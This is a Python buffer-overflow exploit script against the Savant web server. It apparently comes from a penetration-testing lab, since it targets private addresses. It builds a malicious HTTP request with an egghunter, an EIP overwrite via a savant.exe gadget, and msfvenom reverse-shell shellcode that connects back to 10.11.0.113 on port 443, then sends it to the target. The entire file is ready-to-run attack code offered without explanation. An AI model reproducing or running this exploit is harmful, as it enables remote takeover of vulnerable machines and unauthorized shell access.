#!/usr/bin/python
import socket

target_address="10.11.13.39"
target_port=80

buffer2 = "R0cX" + "R0cX" 
# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.11.0.113 -f c -b '\x00\x0a\x0d\x25' EXITFUNC=thread
buffer2 += ("\xda\xc1\xd9\x74\x24\xf4\xbd\x01\x96\x6c\xb4\x5a\x31\xc9\xb1"
"\x52\x31\x6a\x17\x83\xc2\x04\x03\x6b\x85\x8e\x41\x97\x41\xcc"
"\xaa\x67\x92\xb1\x23\x82\xa3\xf1\x50\xc7\x94\xc1\x13\x85\x18"
"\xa9\x76\x3d\xaa\xdf\x5e\x32\x1b\x55\xb9\x7d\x9c\xc6\xf9\x1c"
"\x1e\x15\x2e\xfe\x1f\xd6\x23\xff\x58\x0b\xc9\xad\x31\x47\x7c"
"\x41\x35\x1d\xbd\xea\x05\xb3\xc5\x0f\xdd\xb2\xe4\x9e\x55\xed"
"\x26\x21\xb9\x85\x6e\x39\xde\xa0\x39\xb2\x14\x5e\xb8\x12\x65"
"\x9f\x17\x5b\x49\x52\x69\x9c\x6e\x8d\x1c\xd4\x8c\x30\x27\x23"
"\xee\xee\xa2\xb7\x48\x64\x14\x13\x68\xa9\xc3\xd0\x66\x06\x87"
"\xbe\x6a\x99\x44\xb5\x97\x12\x6b\x19\x1e\x60\x48\xbd\x7a\x32"
"\xf1\xe4\x26\x95\x0e\xf6\x88\x4a\xab\x7d\x24\x9e\xc6\xdc\x21"
"\x53\xeb\xde\xb1\xfb\x7c\xad\x83\xa4\xd6\x39\xa8\x2d\xf1\xbe"
"\xcf\x07\x45\x50\x2e\xa8\xb6\x79\xf5\xfc\xe6\x11\xdc\x7c\x6d"
"\xe1\xe1\xa8\x22\xb1\x4d\x03\x83\x61\x2e\xf3\x6b\x6b\xa1\x2c"
"\x8b\x94\x6b\x45\x26\x6f\xfc\x60\xbc\x6f\x8d\x1c\xc0\x6f\x6c"
"\x66\x4d\x89\x04\x88\x18\x02\xb1\x31\x01\xd8\x20\xbd\x9f\xa5"
"\x63\x35\x2c\x5a\x2d\xbe\x59\x48\xda\x4e\x14\x32\x4d\x50\x82"
"\x5a\x11\xc3\x49\x9a\x5c\xf8\xc5\xcd\x09\xce\x1f\x9b\xa7\x69"
"\xb6\xb9\x35\xef\xf1\x79\xe2\xcc\xfc\x80\x67\x68\xdb\x92\xb1"
"\x71\x67\xc6\x6d\x24\x31\xb0\xcb\x9e\xf3\x6a\x82\x4d\x5a\xfa"
"\x53\xbe\x5d\x7c\x5c\xeb\x2b\x60\xed\x42\x6a\x9f\xc2\x02\x7a"
"\xd8\x3e\xb3\x85\x33\xfb\xd3\x67\x91\xf6\x7b\x3e\x70\xbb\xe1"
"\xc1\xaf\xf8\x1f\x42\x45\x81\xdb\x5a\x2c\x84\xa0\xdc\xdd\xf4"
"\xb9\x88\xe1\xab\xba\x98")

badbuffer = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # egghunter searching for R0cX
badbuffer += "\x90" * (254 - len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP Overwrite 00401D09 savant.exe POP EBP, RETN
httpmethod = "\xb0\x03\x04\x01\x7B\x14" # MOV AL, 3; ADD AL, 1; JPO 14

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n' + buffer2

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()
